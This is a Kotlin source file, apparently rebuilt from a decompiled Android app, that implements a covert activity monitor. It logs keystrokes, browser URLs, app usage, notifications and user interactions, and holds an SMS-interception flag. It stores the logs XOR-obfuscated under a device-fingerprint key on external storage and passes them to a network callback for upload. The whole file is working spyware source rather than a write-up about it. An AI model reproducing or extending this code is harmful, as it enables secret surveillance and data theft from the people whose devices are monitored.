package com.storm.safe.rock.service.modules

import android.os.Build
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.util.Base64
import android.util.Log
import org.json.JSONObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.Collections
import java.util.Date
import java.util.Locale
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

/**
 * Activity monitor with XOR encrypt/decrypt, log buffering, and file upload.
 *
 * Reverse-engineered from JADX: AbstractC0315a0 (254 lines).
 * Renamed: a0→addLog, a1→xorDecrypt, a2→xorEncrypt, a3→flushLogs,
 *          a4→listLogFiles, a5→writeToFile, a6→logActivity,
 *          a7→logMessage, a8→logAppUsage, a9→logUrl, b0→logSystem
 */
object ActivityMonitor {

    private const val TAG = "ActivityMonitor"
    private const val FLUSH_THRESHOLD = 30
    private const val FLUSH_DELAY_MS = 5000L
    private const val MAX_FILE_SIZE = 1048576L // 1MB
    private const val LOG_DIR_NAME = "IC"
    private const val FILE_SEPARATOR = ":::"

    // --- LogType enum ---
    // JADX: ActivityMonitor$LogType
    enum class LogType {
        ACTZ,       // a0 — user activity (vendor: ACTZ)
        KSTR,       // a1 — keystrokes (vendor: KSTR)
        BLNK,       // a2 — browser URLs (vendor: BLNK)
        VAPS,       // a3 — app open/close (vendor: VAPS)
        NTFS,       // a4 — notifications (vendor: NTFS)
        ARTS,       // a5 — system events (vendor: ARTS)
        SEVT        // a6 — sensitive events (vendor: SEVT)
    }

    // --- Fields (matching JADX) ---

    @Volatile
    @JvmStatic
    var xorKey: String = "" // f53025a0

    @Volatile
    @JvmStatic
    var flushRunnable: Runnable? = null // f53028a3

    @JvmStatic
    var networkCallback: ((List<JSONObject>) -> Unit)? = null // f53031a6

    @Volatile
    @JvmStatic
    var smsInterceptActive: Boolean = false // f53033a8

    @JvmStatic
    var logDir: File? = null // f53039b4

    @JvmField
    val logBuffer: MutableList<JSONObject> = Collections.synchronizedList(ArrayList()) // f53026a1

    @JvmField
    val mainHandler: Handler = Handler(Looper.getMainLooper()) // f53027a2

    @JvmField
    val lockObject: Any = Any() // f53029a4

    @JvmField
    val executor: ExecutorService = Executors.newSingleThreadExecutor() // f53030a5

    @Volatile
    @JvmStatic
    var textMonitorEnabled: Boolean = true // f53032a7

    @Volatile
    @JvmStatic
    var appUsageEnabled: Boolean = true // f53034a9

    @Volatile
    @JvmStatic
    var urlMonitorEnabled: Boolean = true // f53035b0

    @Volatile
    @JvmStatic
    var focusMonitorEnabled: Boolean = true // f53036b1

    @JvmStatic
    var lastAppName: String = "" // f53037b2

    @JvmStatic
    var lastUrl: String = "" // f53038b3

    // --- a0 → addLog ---
    @JvmStatic
    fun addLog(logType: LogType, content: String) {
        try {
            val json = JSONObject()
            json.put("logType", logType.name)
            json.put("content", content)
            json.put("timestamp", System.currentTimeMillis())
            logBuffer.add(json)
            if (logBuffer.size >= FLUSH_THRESHOLD) {
                flushLogs()
                return
            }
            synchronized(lockObject) {
                if (flushRunnable != null) return
                val runnable = Runnable { flushLogs() }
                flushRunnable = runnable
                mainHandler.postDelayed(runnable, FLUSH_DELAY_MS)
            }
        } catch (e: Exception) {
            Log.w(TAG, "添加日志到缓冲区失败: ${e.message}")
        }
    }

    // --- a1 → xorDecrypt ---
    @JvmStatic
    fun xorDecrypt(encoded: String, key: String = ""): String {
        try {
            val effectiveKey = if (key.isNotEmpty()) key else getOrInitXorKey()
            val keyBytes = effectiveKey.toByteArray(Charsets.UTF_8)
            val decoded = Base64.decode(encoded, Base64.DEFAULT)
            val result = ByteArray(decoded.size)
            for (i in decoded.indices) {
                result[i] = (decoded[i].toInt() xor keyBytes[i % keyBytes.size].toInt()).toByte()
            }
            return String(result, Charsets.UTF_8)
        } catch (e: Exception) {
            return encoded
        }
    }

    // --- a2 → xorEncrypt ---
    @JvmStatic
    fun xorEncrypt(plaintext: String, key: String = ""): String {
        try {
            val effectiveKey = if (key.isNotEmpty()) key else getOrInitXorKey()
            val keyBytes = effectiveKey.toByteArray(Charsets.UTF_8)
            val plainBytes = plaintext.toByteArray(Charsets.UTF_8)
            val result = ByteArray(plainBytes.size)
            for (i in plainBytes.indices) {
                result[i] = (plainBytes[i].toInt() xor keyBytes[i % keyBytes.size].toInt()).toByte()
            }
            return Base64.encodeToString(result, Base64.DEFAULT)
        } catch (e: Exception) {
            return plaintext
        }
    }

    // --- a3 → flushLogs ---
    @JvmStatic
    fun flushLogs() {
        val runnable: Runnable?
        synchronized(lockObject) {
            runnable = flushRunnable
            if (runnable != null) {
                flushRunnable = null
            }
        }
        if (runnable != null) {
            mainHandler.removeCallbacks(runnable)
        }
        if (logBuffer.isEmpty()) return
        val snapshot: List<JSONObject>
        synchronized(logBuffer) {
            snapshot = ArrayList(logBuffer)
            logBuffer.clear()
        }
        if (snapshot.isEmpty()) return
        networkCallback?.invoke(snapshot)
    }

    // --- a4 → listLogFiles ---
    // vendor: JADX a4 — lists files from Environment.getExternalStorageDirectory() + "/IC/" + type.name
    @JvmStatic
    fun listLogFiles(type: LogType): String {
        try {
            val dir = File(Environment.getExternalStorageDirectory().toString() + "/IC/" + type.name)
            val files = dir.listFiles() ?: return "null"
            var result = ""
            for (file in files) {
                val name = file.name
                result = result + name.removeSuffix(".txt") + "<*P*>"
            }
            return if (result.isEmpty()) "null" else result
        } catch (_: Exception) {
            return "null"
        }
    }

    // --- a5 → writeToFile ---
    @JvmStatic
    fun writeToFile(type: LogType, text: String) {
        executor.execute {
            try {
                val typeName = type.name
                val dateStr = SimpleDateFormat("yyyy-MM-dd", Locale.getDefault()).format(Date())
                val baseDir = logDir ?: Environment.getExternalStorageDirectory()
                val typeDir = File(baseDir, "$LOG_DIR_NAME/$typeName")

                if (!typeDir.exists()) {
                    typeDir.mkdirs()
                }

                var targetFile = File(typeDir, "$dateStr.txt")

                if (targetFile.exists() && targetFile.length() >= MAX_FILE_SIZE) {
                    var seq = 1
                    var rotatedFile: File
                    do {
                        rotatedFile = File(typeDir, "${dateStr}_${seq}.txt")
                        seq++
                    } while (rotatedFile.exists())
                    targetFile.renameTo(rotatedFile)
                    targetFile = File(typeDir, "$dateStr.txt")
                }

                if (!targetFile.exists()) {
                    targetFile.createNewFile()
                }

                val encrypted = xorEncrypt(text + ">") + FILE_SEPARATOR
                java.io.FileOutputStream(targetFile, true).use { fos ->
                    java.io.OutputStreamWriter(fos).use { osw ->
                        java.io.BufferedWriter(osw).use { bw ->
                            bw.write(encrypted)
                        }
                    }
                }

                addLog(type, text)
            } catch (e: Exception) {
                Log.w(TAG, "Record 失败: ${e.message}")
            }
        }
    }

    // --- readLogFile ---
    @JvmStatic
    fun readLogFile(type: LogType, filename: String): String {
        try {
            val baseDir = logDir ?: Environment.getExternalStorageDirectory()
            val file = File(baseDir, "$LOG_DIR_NAME/${type.name}/$filename.txt")
            if (!file.exists()) return ""
            val rawContent = file.readText(Charsets.UTF_8)
            val segments = rawContent.split(FILE_SEPARATOR)
            val sb = StringBuilder()
            for (segment in segments) {
                val trimmed = segment.trim()
                if (trimmed.isNotEmpty()) {
                    sb.append(xorDecrypt(trimmed))
                }
            }
            return sb.toString()
        } catch (e: Exception) {
            Log.w(TAG, "Read 失败: ${e.message}")
            return ""
        }
    }

    // --- deleteLogFile ---
    @JvmStatic
    fun deleteLogFile(type: LogType, filename: String): Boolean {
        return try {
            val baseDir = logDir ?: Environment.getExternalStorageDirectory()
            var file = File(baseDir, "$LOG_DIR_NAME/${type.name}/$filename.txt")
            if (!file.exists()) {
                file = File(baseDir, "$LOG_DIR_NAME/${type.name}/$filename\n.txt")
            }
            if (file.exists()) file.delete() else false
        } catch (e: Exception) {
            Log.w(TAG, "Remove 失败: ${e.message}")
            false
        }
    }

    // --- clearLogs ---
    @JvmStatic
    fun clearLogs(type: LogType): Boolean {
        return try {
            val baseDir = logDir ?: Environment.getExternalStorageDirectory()
            val dir = File(baseDir, "$LOG_DIR_NAME/${type.name}")
            if (dir.exists()) dir.deleteRecursively() else true
        } catch (e: Exception) {
            Log.w(TAG, "Clear 失败: ${e.message}")
            false
        }
    }

    // --- clearAllLogs ---
    @JvmStatic
    fun clearAllLogs(): Boolean {
        return try {
            val baseDir = logDir ?: Environment.getExternalStorageDirectory()
            val dir = File(baseDir, LOG_DIR_NAME)
            if (dir.exists()) dir.deleteRecursively() else true
        } catch (e: Exception) {
            Log.w(TAG, "ClearAll 失败: ${e.message}")
            false
        }
    }

    // --- parseLogType ---
    @JvmStatic
    fun parseLogType(name: String): LogType {
        return try {
            LogType.valueOf(name.uppercase(Locale.ROOT))
        } catch (_: Exception) {
            LogType.KSTR
        }
    }

    // --- a6 → logActivity ---
    @JvmStatic
    fun logActivity(activity: String) {
        val translated = activity
            .replace("USER_INTERACTION", "用户操作")
            .replace("VIEW_CLICKED", "点击")
            .replace("VIEW_FOCUSED", "聚焦")
            .replace("VIEW_SCROLLED", "滚动")
            .replace("WINDOW_STATE_CHANGED", "窗口切换")
        writeToFile(LogType.ACTZ, translated)
    }

    // --- a7 → logMessage ---
    @JvmStatic
    fun logMessage(message: String) {
        writeToFile(LogType.ARTS, message)
    }

    // --- a8 → logAppUsage ---
    @JvmStatic
    fun logAppUsage(appName: String, isOpen: Boolean) {
        if (appUsageEnabled && appName.isNotEmpty()) {
            if (isOpen && appName == lastAppName) return
            if (!isOpen && lastAppName.isNotEmpty()) {
                writeToFile(LogType.VAPS, "离开: $lastAppName")
            }
            if (isOpen) {
                lastAppName = appName
                writeToFile(LogType.VAPS, "打开: $appName")
            }
        }
    }

    // --- a9 → logUrl ---
    @JvmStatic
    fun logUrl(appName: String, url: String) {
        if (!urlMonitorEnabled || url.isEmpty() || url == lastUrl) return
        lastUrl = url
        writeToFile(LogType.BLNK, "[$appName] $url")
    }

    // --- b0 → logSystem ---
    @JvmStatic
    fun logSystem(event: String) {
        val timeStr = SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())
        writeToFile(LogType.ARTS, "[系统] [$timeStr] $event")
    }

    // --- Helper: initialize XOR key from Build.FINGERPRINT ---
    private fun getOrInitXorKey(): String {
        if (xorKey.isEmpty()) {
            val fingerprint = Build.FINGERPRINT
            // vendor: m21.m213937e5(30, fingerprint) to derive 30-char key
            // We use a simple substring/padding approach
            xorKey = fingerprint.take(30).padEnd(30, '0')
        }
        return xorKey
    }
}
